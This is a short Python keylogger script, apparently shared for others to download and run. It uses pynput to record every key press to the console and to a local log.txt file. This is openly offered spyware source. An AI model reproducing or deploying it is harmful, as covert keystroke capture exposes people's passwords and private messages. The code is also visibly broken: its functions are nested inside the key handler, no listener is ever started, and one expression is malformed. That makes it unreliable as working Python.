# Random Keylogger
# I converted this into an EXE so all you gotta do is download this and open it on your host computer

from turtle import onrelease
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed" .format (key))

    if count >= 1000:
        count = 0
        write_file(keys)
        keys = {}


    def write_file(keys):
        with open("log.txt", "a") as f:
            for key in keys:
                k = str(key .replace)()
                if k.find("space") >0:
                    f.write('\n')
                elif k.find("key") == -1:
                    f.write(k) 
          
        

    def on_release(key) : 
        if key == Key.esc:
            return False
